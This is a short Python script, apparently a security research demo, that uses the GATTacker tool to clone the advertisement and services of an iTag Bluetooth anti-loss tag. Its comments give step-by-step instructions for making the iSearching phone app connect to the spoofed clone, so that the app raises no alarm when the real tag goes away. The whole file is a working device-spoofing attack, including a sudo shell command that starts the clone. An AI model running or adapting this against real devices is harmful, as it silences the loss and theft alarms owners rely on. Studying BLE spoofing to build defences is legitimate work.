#!/usr/bin/python

# Requirements: https://github.com/securing/gattacker
# sudo npm install noble
# sudo npm install bleno
# sudo npm install gattacker

# If the Bluetooth adapter isn't working correctly, execute
# the following commands
# sudo hciconfig hci0 down
# sudo hciconfig hci0 up
# sudo hciconfig hci0 reset

import os, subprocess

# iTag - Spoofing - Demo
# Steps
# 1. Edit the variable `PATH_TO_GATTACKER_FOLDER` with the path to the GATTacker installation folder
# 2. Launch the iSearching mobile application (https://play.google.com/store/apps/details?id=com.lenzetech.antilost)
# 3. Turn on the tag by pressing its button until a beep
# 4. Connect to the tag with iSearching
# 5. Launch this script
# 6. Turn off the tag by presing its button until a beep
# iSearching should be now connected to the clone and not to the real device. The alarm isn't fired.

# Path to the GATTacker installation folder
# For example: /home/samuel/Desktop/BLETools/node_modules/gattacker/'
PATH_TO_GATTACKER_FOLDER = '/home/samuel/Desktop/BLETools/node_modules/gattacker/'
PATH_TO_CURRENT_FOLDER = os.path.dirname(os.path.abspath(__file__))

# move to the GATTacker installation folder
os.chdir(PATH_TO_GATTACKER_FOLDER)
# execute and launch the cloned iTag
subprocess.call('sudo nodejs advertise.js -a ' + PATH_TO_CURRENT_FOLDER + '/devices/ffffa008378f_iTAG-.adv.json -s ' + PATH_TO_CURRENT_FOLDER + '/devices/ffffa008378f.srv.json -S', shell=True)
